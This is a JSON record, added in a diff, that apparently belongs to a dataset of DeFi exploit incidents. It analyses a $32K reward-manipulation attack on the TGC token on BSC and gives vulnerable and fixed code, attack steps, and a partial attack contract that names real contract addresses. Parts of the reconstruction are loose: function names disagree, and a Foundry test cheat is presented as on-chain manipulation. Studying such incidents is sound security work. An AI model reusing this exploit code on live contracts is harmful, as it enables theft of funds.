@@ -1,0 +1,40 @@
+{
+ "id": "2024__2024-05-XX_TGC_SelectorBasedRewardManipulation",
+ "source_file": "2024/2024-05-XX_TGC_SelectorBasedRewardManipulation.md",
+ "title": "TGC — Unvalidated Selector Reward Manipulation + Flash Swap Analysis",
+ "date": "2024-05-01",
+ "protocol": "TGC",
+ "chain": "BSC",
+ "loss_raw": "~$32,000",
+ "loss_usd": 32000.0,
+ "root_cause": "Calling selector `0x836aefb0` on the vulnerable contract with a 100 trillion TGC parameter to manipulate internal state, then after a 5-hour timestamp manipulation, claiming rewards via selector `0xfd5a466f` inside a flash swap callback",
+ "attack_tx": null,
+ "vulnerable_contract": "0x32F9188d",
+ "classes": [
+  "staking-reward"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: reward state manipulation via unvalidated selectors\ncontract TGCVuln {\n    mapping(address => uint256) public rewards;\n    uint256 public lastUpdate;\n\n    // selector: 0x836aefb0\n    // parameter: uint256 amount (100 trillion TGC)\n    function setRewardAccumulator(uint256 amount) external {\n        // No access control — anyone can set the reward accumulator\n        rewards[msg.sender] += amount;\n        lastUpdate = block.timestamp;\n    }\n\n    // selector: 0xfd5a466f\n    // Called from flash swap callback — withdraws rewards\n    function claimAccumulatedRewards() external {\n        require(block.timestamp >= lastUpdate + 5 hours, \"too early\");\n        uint256 reward = rewards[msg.sender];\n        rewards[msg.sender] = 0;\n        TGC.transfer(msg.sender, reward);\n    }\n}\n\n//",
+  "// File: TGC_decompiled.sol\ncontract TGC {\n    function transferOwnership(address p0) external {}  // ❌ Vulnerability\n\n    // selector: 0xf9f05581\n    function unknown_f9f05581() external {}\n\n    // selector: 0xfd5a466f\n    function unknown_fd5a466f() external {}\n\n    // selector: 0x2ccebc28\n    function unknown_2ccebc28() external {}\n\n    // selector: 0x715018a6\n    function renounceOwnership() external {}\n\n    // selector: 0x836aefb0\n    function joinPledge(uint256 p0) external {}\n\n    // selector: 0x8da5cb5b\n    function owner() external view returns (address) {}\n\n    // selector: 0x6eb1769f\n    function unknown_6eb1769f() external {}\n\n    // selector: 0xdd62ed3e\n    function allowance(address p0, address p1) external view returns (uint256) {}\n\n    // selector: 0x23b872dd\n    // 📌 Arbitrary transferFrom — approval validation required\n    function transferFrom(address p0, address p1, uint256 p2) external {}\n\n    // selector: 0x70a08231\n    function balanceOf(address p0) external view returns (uint256) {}\n\n    // selector: 0xa9059cbb"
+ ],
+ "code_after": [
+  "✅ Safe code\nfunction setRewardAccumulator(uint256 amount) external onlyOwner { ... }\nfunction claimAccumulatedRewards() external {\n    require(rewards[msg.sender] > 0, \"no rewards\");\n    require(rewards[msg.sender] <= MAX_CLAIM, \"claim too large\");\n    // ...\n}"
+ ],
+ "steps": [
+  "→ [1] 100 USDT → TGC swap",
+  "→ [2] TGC.approve(vuln, maxAmount)",
+  "→ [3] vuln.call(0x836aefb0, 100_000_000_000_000e18)",
+  "No access control → rewards[attacker] += 100 trillion TGC",
+  "→ [4] vm.warp(block.timestamp + 5 hours)",
+  "→ [5] Execute flash swap on USDT/TGC pair",
+  "→ [6] pancakeCall() callback:",
+  "block.timestamp >= lastUpdate + 5h → rewards disbursed",
+  "→ [7] TGC → USDT reverse swap",
+  "→ [8] Repay flash swap",
+  "→ [9] ~$32K profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] 100 USDT → TGC swap\n  │\n  ├─→ [2] TGC.approve(vuln, maxAmount)\n  │\n  ├─→ [3] vuln.call(0x836aefb0, 100_000_000_000_000e18)\n  │         └─ No access control → rewards[attacker] += 100 trillion TGC\n  │         └─ lastUpdate = block.timestamp\n  │\n  ├─→ [4] vm.warp(block.timestamp + 5 hours)\n  │         └─ Advance timestamp by 5 hours (testnet/manipulation)\n  │\n  ├─→ [5] Execute flash swap on USDT/TGC pair\n  │\n  ├─→ [6] pancakeCall() callback:\n  │         └─ vuln.call(0xfd5a466f)\n  │         └─ block.timestamp >= lastUpdate + 5h → rewards disbursed\n  │         └─ Receive 100 trillion TGC\n  │\n  ├─→ [7] TGC → USDT reverse swap\n  │\n  ├─→ [8] Repay flash swap\n  │\n  └─→ [9] ~$32K profit",
+  "contract AttackContract {\n    address constant vuln  = 0x32F9188d6D86Bf88dbAc3ceEe5958aDf1aa609df;\n    IERC20  constant TGC   = IERC20(0x523aA213FE806778Ffa597b6409382fFfcc12De2);\n    IERC20  constant USDT  = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    address constant pair  = /* USDT/TGC pair */;\n\n    function testExploit() external {\n        // [1] 100 USDT → TGC\n        swapUSDTToTGC(100e18);\n\n        // [2] selector 0x836aefb0: accumulate 100 trillion TGC rewards\n        TGC.approve(vuln, type(uint256).max);\n        (bool ok1,) = vuln.call(\n            abi.encodeWithSelector(bytes4(0x836aefb0), uint256(100_000_000_000_000e18))\n        );\n        require(ok1);\n\n        // [3] Advance timestamp by 5 hours (blockchain manipulation)\n        // vm.warp(block.timestamp + 5 hours)"
+ ]
+}
